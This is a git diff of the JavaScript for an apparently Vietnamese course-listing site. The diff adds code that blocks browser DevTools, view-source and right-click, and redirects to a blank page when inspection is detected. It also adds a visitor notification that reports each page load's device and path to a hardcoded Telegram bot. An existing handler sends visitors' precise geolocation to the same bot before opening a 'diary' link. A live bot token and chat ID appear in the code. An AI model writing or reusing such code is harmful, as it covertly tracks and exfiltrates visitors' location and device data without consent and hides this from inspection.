@@ -17,6 +17,43 @@ const toastRoot = document.getElementById("toast-root");
 const TELEGRAM_BOT_TOKEN = "8632589547:AAGQjBlLd906MzjBsr8ToOTXp-J_1VoPqGU";
 const TELEGRAM_CHAT_ID = "6149032213";
 
+// Security: Chặn phím tắt mở DevTools và View Source
+function protectDevTools() {
+  document.addEventListener("keydown", (e) => {
+    if (
+      e.key === "F12" ||
+      (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
+      (e.ctrlKey && e.key === "u")
+    ) {
+      e.preventDefault();
+      globalThis.location.href = "about:blank";
+    }
+  });
+
+  document.addEventListener("contextmenu", (e) => e.preventDefault());
+
+  // Phát hiện DevTools mở thủ công bằng cách kiểm tra kích thước hoặc debugger
+  const detector = () => {
+    const threshold = 160;
+    const widthDiff = globalThis.outerWidth - globalThis.innerWidth > threshold;
+    const heightDiff = globalThis.outerHeight - globalThis.innerHeight > threshold;
+
+    if (widthDiff || heightDiff) {
+      globalThis.location.href = "about:blank";
+    }
+    
+    // Debugger trick
+    const start = new Date();
+    debugger;
+    const end = new Date();
+    if (end - start > 100) {
+      globalThis.location.href = "about:blank";
+    }
+  };
+  
+  setInterval(detector, 2000);
+}
+
 
 const BOOKMARK_KEY = "learn-bookmarks";
 let globalResults;
@@ -468,23 +505,43 @@ function updateUniversityClock() {
 
 function initUniversityClock() {
   updateUniversityClock();
-  window.setInterval(updateUniversityClock, 1000);
+  globalThis.setInterval(updateUniversityClock, 1000);
 }
 
 let isLocationRequesting = false;
 
 async function sendTelegramMessage(text) {
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.warn("Telegram config missing.");
+    return;
+  }
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   try {
-    await fetch(url, {
+    console.log("Sending Telegram message...");
+    const response = await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" }),
     });
+    
+    const result = await response.json();
+    if (!response.ok) {
+      console.error("Telegram API Error:", result);
+    } else {
+      console.log("Telegram message sent successfully.");
+    }
   } catch (error) {
-    console.error("Telegram Error:", error);
+    console.error("Network Error (Telegram):", error);
   }
+}
+
+async function sendVisitorNotification() {
+  const isReturning = localStorage.getItem("returning_visitor");
+  const type = isReturning ? "RE-VISIT" : "NEW VISITOR";
+  localStorage.setItem("returning_visitor", "true");
+
+  const message = `<b>🌐 ${type}</b>\n\n⏰ Time: ${new Date().toLocaleString("vi-VN")}\n📱 Device: ${navigator.userAgent}\n🌍 Page: ${window.location.pathname}`;
+  await sendTelegramMessage(message);
 }
 
 function handleDiaryAccess(event) {
@@ -516,15 +573,16 @@ function handleDiaryAccess(event) {
       const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
       const message = `<b>🔓 TRUY CẬP NHẬT KÝ</b>\n\n📍 Vị trí: <a href="${mapsLink}">Xem trên Maps</a>\n🎯 Độ chính xác: ${accuracy.toFixed(1)}m\n⏰ Thời gian: ${new Date().toLocaleString("vi-VN")}\n📱 Thiết bị: ${navigator.userAgent}`;
 
+      console.log("Location found, sending notification...");
       await sendTelegramMessage(message);
-
-      // Mở nhật ký sau khi đã gửi thông báo thành công
-      window.open(diaryUrl, "_blank");
 
       // Reset trạng thái
       isLocationRequesting = false;
       btn.style.opacity = "";
       btn.style.cursor = "";
+
+      // Mở nhật ký sau khi đã gửi thông báo
+      globalThis.open(diaryUrl, "_blank");
     },
     async (error) => {
       let errorMsg = "Lỗi định vị";
@@ -624,12 +682,17 @@ function initEvents() {
 
 function init() {
   console.log("Initializing app...");
+  protectDevTools();
+  
   const savedTheme = localStorage.getItem("theme");
   const preferredTheme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
   setTheme(savedTheme || preferredTheme);
   augmentCourseCards();
   initEvents();
   applyCourseFilters();
+  
+  // Gửi thông báo visitor
+  sendVisitorNotification();
 }
 
 init();
